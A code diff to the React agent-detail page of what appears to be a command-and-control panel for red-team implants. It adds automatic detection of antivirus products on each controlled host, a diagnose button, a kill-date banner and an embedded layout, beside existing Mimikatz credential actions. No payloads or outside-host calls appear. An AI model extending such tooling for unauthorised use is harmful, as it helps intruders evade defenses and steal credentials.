@@ -1,9 +1,9 @@
 "use client";
 
-import { useCallback, useEffect, useState, useMemo, useRef, memo } from "react";
+import { useCallback, useEffect, useState, useMemo, useRef, memo, type ReactNode } from "react";
 import { useParams, useRouter } from "next/navigation";
 import Link from "next/link";
-import { api, ApiError } from "@/lib/api";
+import { api, ApiError, pollTask } from "@/lib/api";
 import { paths } from "@/lib/api-paths";
 import { downloadText } from "@/lib/download";
 import { ConfirmModal } from "@/components/ui/confirm-modal";
@@ -13,6 +13,7 @@ import { Input } from "@/components/ui/input";
 import { Card } from "@/components/ui/card";
 import { Skeleton } from "@/components/ui/skeleton";
 import { PageContainer } from "@/components/ui/page-container";
+import { cn } from "@/lib/utils";
 import { toast } from "sonner";
 import { useI18n } from "@/lib/i18n";
 import { logger } from "@/lib/logger";
@@ -22,6 +23,7 @@ import { Bug } from "lucide-react";
 import { Banner } from "@/components/ui/banner";
 import { AgentStatus, AgentDetail as AgentDetailExt, AgentTaskRecord } from "@/types/agent";
 import AgentHeader from "./_components/AgentHeader";
+import AgentDetailChrome from "./_components/AgentDetailChrome";
 import AgentStatsGrid from "./_components/AgentStatsGrid";
 import AgentTaskList from "./_components/AgentTaskList";
 import AgentScreenshots from "./_components/AgentScreenshots";
@@ -67,6 +69,7 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
   const params = useParams();
   const router = useRouter();
   const id = agentIdProp || (params?.id as string);
+  const embedded = Boolean(onClose);
   const onCloseRef = useRef(onClose);
   onCloseRef.current = onClose;
   const [confirmUninstall, setConfirmUninstall] = useState(false);
@@ -134,6 +137,8 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
 
   const [credCount, setCredCount] = useState<number | null>(null);
   const [mimikatzReady, setMimikatzReady] = useState(false);
+  const [avProducts, setAvProducts] = useState<string[]>([]);
+  const [avFetched, setAvFetched] = useState(false);
 
   const { processList, loading: processLoading, loadFailed, expanded: processExpanded, setExpanded: setProcessExpanded, load: loadProcessList, refresh: refreshProcessList } = useAgentProcessTree(
     id,
@@ -209,6 +214,34 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
     return () => controller.abort();
   }, []);
 
+  // Auto-fetch running AV (security hostinfo) — show in header without manual click
+  useEffect(() => {
+    if (!id || status !== "online" || avFetched) return;
+    const controller = new AbortController();
+    let cancelled = false;
+    (async () => {
+      try {
+        const fd = new FormData();
+        fd.set("category", "security");
+        const dispatched = await api.postFormData(paths.agents.cmd(id, "hostinfo"), fd) as { task_id?: number };
+        const taskId = dispatched.task_id;
+        if (!taskId) return;
+        await pollTask(id, taskId, { timeoutMs: 60000, signal: controller.signal });
+        const task = await api.get(paths.agents.task(id, String(taskId)), { signal: controller.signal }) as { result?: string; data?: { result?: string } };
+        const taskResult = (task as unknown as { result?: string }).result ?? task.data?.result ?? "";
+        if (!taskResult || cancelled) return;
+        const parsed = JSON.parse(taskResult) as { sections?: Record<string, { av_products?: Array<{ name?: string }> }> };
+        const sec = parsed.sections?.security || (parsed.sections as Record<string, unknown>)?.Security as unknown as { av_products?: Array<{ name?: string }> } || {};
+        const av = Array.isArray(sec.av_products) ? sec.av_products : [];
+        const names = av.map((a) => String(a.name || "")).filter(Boolean);
+        if (!cancelled) { setAvProducts(names); setAvFetched(true); }
+      } catch (e) {
+        if ((e as Error).name !== "AbortError" && !cancelled) setAvFetched(true);
+      }
+    })();
+    return () => { cancelled = true; controller.abort(); };
+  }, [id, status, avFetched]);
+
   useEffect(() => {
     if (!data?.agent || sleepDirtyRef.current) return;
     setSleepValue(data.agent.current_interval ?? 0);
@@ -229,6 +262,18 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
   const pendingTasks = data?.pending_tasks ?? 0;
   const failedTasks = data?.failed_tasks ?? 0;
 
+  const handleDiagnose = useCallback(async () => {
+    setActionLoading("diagnose");
+    try {
+      const res = await api.post(paths.agents.diagnose(id), {}) as { count?: number };
+      toast.success(t("agents.detail_diagnose_queued").replace("{count}", String(res.count ?? 5)));
+    } catch {
+      toast.error(t("agents.detail_diagnose_failed"));
+    } finally {
+      setActionLoading(null);
+    }
+  }, [id, t]);
+
   const quickAction = useCallback(
     async (action: string, label: string) => {
       if (credActionBlockReason(action, mimikatzReady) === "missing_module") {
@@ -241,10 +286,10 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
       }
       setActionLoading(action);
       try {
-        const suffix = credActionEndpoint(action);
+        const suffix = credActionEndpoint(action) || (action === "beacon_now" ? "beacon_now" : "");
         const data = suffix
           ? await api.post(paths.agents.cmd(id, suffix), {})
-          : await api.postJson(paths.agents.command(id), { type: action, command: "" });
+          : await api.postJson(paths.toolkit.action(id), { action, param: "", shell: "" });
         const taskId = Number((data as { task_id?: number }).task_id);
         const queued = Number.isFinite(taskId) && taskId > 0;
         const kind = queued ? useInteractStore.getState().revealTask(id, taskId) : "offer";
@@ -364,9 +409,24 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
   const handleSleepChange = useCallback((v: number) => { sleepDirtyRef.current = true; setSleepValue(v); }, []);
   const handleJitterChange = useCallback((v: number) => { sleepDirtyRef.current = true; setJitterValue(v); }, []);
 
+  const wrap = (body: ReactNode) => (
+    <div className={cn("flex min-h-0 flex-col bg-background", embedded && "h-full")}>
+      <AgentDetailChrome
+        agentId={id}
+        hostname={data?.agent?.hostname}
+        status={data?.agent?.status as AgentStatus | undefined}
+        embedded={embedded}
+        onClose={onClose}
+      />
+      <div className={cn("min-h-0", embedded && "flex-1 overflow-y-auto px-4 py-4 sm:px-6 sm:py-5 lg:px-8 lg:py-6")}>
+        {body}
+      </div>
+    </div>
+  );
+
   if (loading) {
-    return (
-      <PageContainer>
+    return wrap(
+      <PageContainer embedded={embedded}>
         <div className="space-y-4">
           <Skeleton className="h-4 w-24" />
           <Card className="p-(--card-spacing)"><div className="flex items-center gap-4">
@@ -375,13 +435,13 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
           </div></Card>
           <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">{[1,2,3,4].map((n) => (<Card key={n} className="p-4"><Skeleton className="h-3 w-16 mb-2" /><Skeleton className="h-4 w-24" /></Card>))}</div>
         </div>
-      </PageContainer>
+      </PageContainer>,
     );
   }
 
   if (!data) {
-    return (
-      <PageContainer>
+    return wrap(
+      <PageContainer embedded={embedded}>
         <div className="text-center py-20">
           <Bug className="size-4" />
           <h2 className="text-xl font-semibold tracking-tight text-foreground leading-tight mb-2">{loadError ? t("agents.detail_load_failed") : t("agents.detail_not_found")}</h2>
@@ -395,18 +455,18 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
             )}
           </div>
         </div>
-      </PageContainer>
+      </PageContainer>,
     );
   }
 
-  return (
-    <PageContainer className="relative">
+  return wrap(
+    <PageContainer className="relative" embedded={embedded}>
       {loadError && (
         <Banner tone="destructive" className="mb-3" action={<Button variant="ghost" size="sm" onClick={() => loadDetail()}>{t("agents.detail_retry")}</Button>}>
           {t("agents.detail_load_error_msg")}
         </Banner>
       )}
-      <AgentStatusBar agent={agent as Partial<AgentDetailExt>} agentId={id} status={status} />
+      {!embedded && <AgentStatusBar agent={agent as Partial<AgentDetailExt>} agentId={id} status={status} />}
       <AgentHeader
         agent={agent as Partial<AgentDetailExt>}
         agentId={id}
@@ -415,15 +475,27 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
         onQuickAction={quickAction}
         credCount={credCount}
         mimikatzReady={mimikatzReady}
+        avProducts={avProducts}
         onKill={handleKill}
         onUninstall={handleUninstall}
         onMigrate={handleMigrate}
         onPopOut={handlePopOut}
       />
 
+      {agent.kill_date && (() => {
+            const kd = new Date(agent.kill_date);
+            const days = Math.ceil((kd.getTime() - Date.now()) / 86400000);
+            if (days <= 7 && days >= 0) return <Banner tone={days <= 2 ? "destructive" : "warning"} className="mb-4">{t("agents.detail_kill_date_countdown").replace("{days}", String(days))}</Banner>;
+            if (days < 0) return <Banner tone="destructive" className="mb-4">{t("agents.detail_kill_date_expired")}</Banner>;
+            return null;
+          })()}
       <div className="grid grid-cols-1 gap-6 lg:grid-cols-[minmax(0,1fr)_320px]">
         {/* ── Main column: live sections ── */}
         <div className="min-w-0">
+          <div className="flex gap-2 mb-4">
+            <Button size="sm" variant="outline" onClick={handleDiagnose} disabled={actionLoading === "diagnose" || status !== "online"}>{actionLoading === "diagnose" ? t("agents.detail_diagnosing") : t("agents.detail_diagnose")}</Button>
+            <span className="text-xs text-muted-foreground self-center">{t("agents.detail_diagnose_hint")}</span>
+          </div>
           <AgentTaskList
             tasks={tasks as AgentTaskRecord[]}
             agentId={id}
@@ -570,6 +642,6 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
           </DialogContent>
         </Dialog>
       )}
-    </PageContainer>
+    </PageContainer>,
   );
 })
